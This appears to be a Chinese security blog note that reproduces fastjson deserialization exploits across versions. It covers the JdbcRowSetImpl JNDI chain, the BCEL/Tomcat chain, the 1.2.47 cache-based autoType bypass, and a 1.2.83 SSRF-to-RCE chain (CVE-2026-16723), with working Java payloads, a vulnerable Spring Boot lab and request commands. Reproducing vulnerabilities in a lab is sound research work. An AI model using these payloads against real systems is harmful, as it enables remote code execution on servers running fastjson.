---
title: fastjson反序列化全版本漏洞利用
published: 2026-10-11
description: fastjson 各版本反序列化漏洞的利用方式与利用链分析
tags: [Java安全, 反序列化, fastjson]
category: 笔记
draft: false
---

# fastjson反序列化全版本漏洞利用

## 和java反序列化的区别

虽然都叫反序列化，但是fastjson和正常的java反序列化的流程**完全不同**，我们不需要他继承serializable接口，变量也不需要不是transient，这是因为fastjson反序列化实际上是自己实现了一个反序列化，根据之前的分析，我们知道一个变量要可控，需要他是public，或者有**setter**方法或者有满足条件的**getter**类

当然最终表现形式也是**反射**调用或者**动态类加载**



## 1.2.24 及以前版本利用

### JdbcRowSetImpl链

在jdk的内置类**JdbcRowSetImpl**中的connect方法中存在JNDI的lookup代码 根据我们前面对JNDI的学习 如果这里的getDataSourceName()输出的值也即是dataSource可以控制的话 就可以令其为远程恶意类（低版本）或者其他方式（高版本）

来执行ldap或rmi的恶意代码

![image-20260923201434681](/images/fastjson/image-20260923201434681.png)

这个类确实存在dataSource的setter 所以我们可以控制他的值

![image-20260923202638917](/images/fastjson/image-20260923202638917.png)

所以下一步就是找到一个调用connect方法的**setter**，为什么不是getter呢，根据我们前一次的分析知道getter方法是在反序列化执行完setter后走到toJSON的时候才会触发getter，或者要满足几种条件（比如返回值的约束等等），这里返回值已经不满足条件并且前面要完全不报错很困难，所以直接选择**必定触发**的setter

![image-20260923203037781](/images/fastjson/image-20260923203037781.png)

找到了在setAutoCommit中直接调用了connect方法，autoCommit是一个布尔值

![image-20260923203727858](/images/fastjson/image-20260923203727858.png)

所以现在就可以直接写利用代码了

```
package org.example;

import com.alibaba.fastjson.JSON;

public class FastjsonJdbcRowSetImpl {
    public static void main(String[] args) {
        String s ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/KTlWgkbz\",\"autocommit\":true}";
        JSON.parseObject(s);
    }
}
```

我用yakit起了一个ldap服务 直接部署RuntimeExec恶意类（因为测试版本小于8u191）最终成功利用

![image-20260923204053329](/images/fastjson/image-20260923204053329.png)

**这里有一个细节值得注意**

方法名叫setDataSourceName 而变量名叫dataSource 两个不一致 但我们传递给parseObject的时候需要以方法名为准 比如这里就传递DataSourceName（首字母大小写无影响）因为实际上调用时是根据你setter的名称进行拼接

#### 局限性

很明显由于JNDI的原因 这个链子受限于jdk版本 并且由于远程调用只适用于出网的环境



### BCEL链

这条链适用于不出网的环境

在jdk内置的一个BCEL ClassLoader中的loadClass存在defineClass 也就是从字节码中动态加载类

根据这里的逻辑我们需要class_name满足以\$\$BCEL$$开头，就能执行defineClass，在defineClass之前还进行了createClass，在这个方法里对class_name进行了解码，所以我们传入前还需要进行对应的编码

![image-20260923210107349](/images/fastjson/image-20260923210107349.png)

而要执行这个loadClass方法，需要用到**tomcat**内的一个类BasicDataSource

在createConnectionFactory()方法里 当driverClassLoader不为null时，会使用driverClassLoader对driverClassName进行loadClass

所以当我们将driverClassLoader改为刚刚的ClassLoader，driverClassName改为设计过的恶意名后就能执行代码

刚好这里的ClassLoader和driverClassName都具有setter

![image-20260923212436170](/images/fastjson/image-20260923212436170.png)

同一个类的createDataSource又调用了createConnectionFactory方法

而这个类的getConnection里又调用了createDataSource，所以两步就找到了对应的getter

![image-20260923213327851](/images/fastjson/image-20260923213327851.png)

这里不同的是我们书写的时候并不需要把connection写出来，因为这是触发的getter，getter不是在反序列化中触发的，而是在后续的toJSON中触发，他会自动调用全部的getter

注意内部嵌套类也需要用@type引出

```
package org.example;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.nio.file.Files;
import java.nio.file.Paths;

public class FastjsonBcel {
    public static void main(String[] args) throws Exception {

        byte[] bytes = Files.readAllBytes(Paths.get("D:\\Download\\test\\Calctest.class"));

        String bcelCode = Utility.encode(bytes, true);

        String payload = "{" +
                "\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassName\":\"$$BCEL$$"+ bcelCode +"\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}" +
                "}";

        JSON.parseObject(payload);
    }
}
```

#### ![image-20260923214532234](/images/fastjson/image-20260923214532234.png)局限性

依赖Tomcat，且仅适用于 JDK 8u251 之前（之后JDK 内置的BCEL ClassLoader就被移除了）



### TemplatesImpl链

需要 Fastjson 开启 `SupportNonPublicField` 特性（因为 `_bytecodes` 是私有字段） 利用条件苛刻 实战中往往打不通 所以这里就不具体分析了



## 1.2.25-1.2.47版本利用

当我们把版本升级到1.2.25再使用BCEL链尝试弹计算器会发现失败并且报错中提示 autoType is not support![image-20260924101116847](/images/fastjson/image-20260924101116847.png)

我们跟进调试后看到和上一个版本不同的是 在loadClass之前进行了checkAutoType的校验

校验代码很长 简单来说就是加入了白名单和黑名单的机制，并且引入了autoTypeSupport这个开关 而他默认是关闭的

![image-20260924101352817](/images/fastjson/image-20260924101352817.png)

![image-20260924101451920](/images/fastjson/image-20260924101451920.png)

在这个版本之前有一些**绕过黑名单检测**的方式，但都只限定于特定版本，利用价值不大

**最直接**的方式是利用 Fastjson 的 **mappings 缓存**，如果缓存命中就直接返回，不管是否在黑名单  autoType开关是否打开，都会直接返回

![image-20260924102346199](/images/fastjson/image-20260924102346199.png)

所以现在我们就去看怎么写入缓存 在loadClass里写入了类

![image-20260924103706945](/images/fastjson/image-20260924103706945.png)

在MiscCodec里的反序列化方法中调用了这个loadClass 他的逻辑是直接把strVal作为Class加载进mappings

![image-20260924103812608](/images/fastjson/image-20260924103812608.png)

而这个MiscCodec实现了序列化器和反序列化器

![image-20260924103940990](/images/fastjson/image-20260924103940990.png)

在之前的代码中我们知道在反序列化时反序列化器其实是来自config当中

而config其实事先就写入了一些反序列化器 当我们反序列化的类是Class时就会调用MiscCodec这个反序列化器

也即是说我们可以先反序列化恶意类使其写入mappings缓存中，再进行调用就直接从mappings里拿了![image-20260924104056706](/images/fastjson/image-20260924104056706.png)

![image-20260924104323068](/images/fastjson/image-20260924104323068.png)



所以exp就可以书写了

```
package org.example;

import com.alibaba.fastjson.JSON;

public class FastjsonBefore1247 {
    public static void main(String[] args) {
        String s = "{" +
                "\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/EiSbfMCP\",\"autoCommit\":true}" +
                "}";
        JSON.parseObject(s);
    }
}
```



![image-20260924105418012](/images/fastjson/image-20260924105418012.png)



##  CVE-2026-16723 1.2.68之后版本利用

在今年的一个7月份的一个CVE当中，发现了可以不需要autoType的利用方式 而因为1.2.83已经是fastjson1.x的归档版本很久没有更新了 直到发布1.2.84才进行了修复

### 从SSRF出发

在1.2.83的checkAutoType中有这样一段代码

fastjson 会用 getResourceAsStream方法去读取这个类的字节

而resource就是我们可控的@type

这里getResourceAsStream 接收的是一个类名，而只要你把它写成 URL 的样子，就可以按照URL解析

但是这里有个小问题

`typeName.replace('.', '/')`类名里的每一个点都会被替换成斜杠，所以直接写127.0.0.1就无法正常解析。绕过的办法很简单

`127.0.0.1` 写成一个整数就是 `2130706433`（或用localhost替代）

`{"@type":"http://2130706433:1314/probe"}`

![image-20260925173914159](/images/fastjson/image-20260925173914159.png)

![image-20260925174049186](/images/fastjson/image-20260925174049186.png)

注意只有 Spring Boot 的 fat jar 类加载器（`LaunchedURLClassLoader`）才会把一个长得像 URL 的类名真正变成一次请求 ，如果用普通的 `java -jar` 跑，或者作为 WAR 部署到一台普通的 Tomcat 上，就会把那个名字当成本地文件路径来处理，不会向外发起任何请求

我们可以搭建环境进行测试

`pom.xml`

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
         https://maven.apache.org/xsd/maven-4.0.0.xsd">

    <modelVersion>4.0.0</modelVersion>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.18</version>
    </parent>

    <groupId>lab</groupId>
    <artifactId>fastjson-cve-lab</artifactId>
    <version>0.0.1-SNAPSHOT</version>

    <properties>
        <java.version>8</java.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <!-- 漏洞版本 -->
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.83</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
```

`src/main/java/lab/Application.java`

```
package lab;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication
@RestController
public class Application {

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

    @PostMapping(value = "/parse", consumes = "application/json")
    public String parse(@RequestBody String body) {
        try {
            // CVE-2026-16723 利用前提：让 fastjson 用 LaunchedURLClassLoader 探测/加载 jar: 类
            ParserConfig.getGlobalInstance().setAsmEnable(false);
            ParserConfig.getGlobalInstance().setDefaultClassLoader(ParserConfig.class.getClassLoader());
            JSON.parse(body);
            return "parsed";
        } catch (Exception e) {
            return e.getClass().getName() + ": " + e.getMessage();
        }
    }
}
```

`src/main/resources/application.properties`

```
server.address=127.0.0.1
server.port=8080
```

然后用mvn打包

```
$env:MAVEN_OPTS="-Daether.connector.https.securityMode=insecure"
mvn -q -DskipTests clean package
mvn dependency:tree "-Dincludes=com.alibaba:fastjson"
```

```
$body = '{"@type":"http://2130706433:1314/probe"}'
>>   -Uri "http://127.0.0.1:8080/parse" `
>>   -Method Post `
>>   -ContentType "application/json" `
>>   -Body $body
```

![image-20260925182317610](/images/fastjson/image-20260925182317610.png)

测试发现确实向1314端口发送了请求 SSRF成功

测试后`jar:`也可以访问

在之后的代码中也可以看到

如果我们 jar 里的那个类带有 JSONType，fastjson 就会加载它并把它返回，而且这一步发生在 "autoType is not support" 之前

![image-20260925183343971](/images/fastjson/image-20260925183343971.png)

所以现在我们的计划就是让 fastjson 通过 `getResourceAsStream` 从一个我们可控的地方拿到我们的类，创建实例并运行恶意代码

### SSRF到RCE

在jdk9以前（我这里是jdk8）

用  `jar:http://host/jar!/Class`向远程 jar 里的某个类 这样一来，用 `jar:http:..2130706433:1314.x!.y`，fastjson 就会下载这个 jar，y中的静态代码随之执行

但是执行也是有条件的

![image-20260925211601694](/images/fastjson/image-20260925211601694.png)

我们在测试时

我这里用到的是[GitHub - Superman-L/CVE-2026-16723: fastjson jsontype利用 · GitHub](https://github.com/Superman-L/CVE-2026-16723)来生成恶意jar

`ParserConfig.getGlobalInstance().setDefaultClassLoader(ParserConfig.class.getClassLoader());`就是为了拿到Spring Boot fat-JAR 的`LaunchedURLClassLoader` 只有它会解析 `jar:` 协议

真实环境里这个设置不需要显示设置 可能是直接开放的 所以我们可以利用

![image-20260925213150950](/images/fastjson/image-20260925213150950.png)

### linux端jdk全版本RCE

在windows下只有jdk8及以下可以执行这个RCE

而在之后的现代jdk版本中传入的body里带 `://`就只会下载而无法正常加载

这里就需要借助linux中的**/proc/self/fd**

![image-20260925213536752](/images/fastjson/image-20260925213536752.png)

我们只需要第一次的时候正常让他下载远程jar到临时文件中

然后第二次直接从**/proc/self/fd**中载入即可执行命令

我们在wsl中用jdk21来测试

首先我在原本的exp里加入了一个GenProbeFdMulti用于生成文章中一样逻辑的候选类

然后在这个目录起一个http服务

第一次传递 这次会返回autoType is not support

然后我们找到对应的描述符编号N，比如这里是15（实际运行时需要for循环爆破）

再通过/proc/self/fd/15来访问对应的类 最终成功执行命令

至于为什么恶意类y也要写成y_15 这里是一个对齐的机制

JVM 规定：字节码里的 this_class 必须和你申报的名字一字不差，否则拒绝加载

说实话这个对齐机制我也没有完全弄懂，但是不影响漏洞复现

![image-20260925225525260](/images/fastjson/image-20260925225525260.png)



## 参考资料

[Fastjson 1.2.83 远程代码执行：AutoType 关闭下的 SSRF 到 RCE](https://fearsoff.org/cn/research/fastjson-1-2-83-rce)

[CVE-2026-16723复现（fastjson rce） – wsxk's blog – 小菜鸡](https://wsxk.github.io/fastjson_cve/)

[fastjson反序列化漏洞2-1.2.24利用_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1pP411N726?spm_id_from=333.788.videopod.sections&vd_source=71b5899cb0df1e5ef5f681dfd669167a)

[fastjson反序列化漏洞3-<=1.2.47绕过_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=71b5899cb0df1e5ef5f681dfd669167a)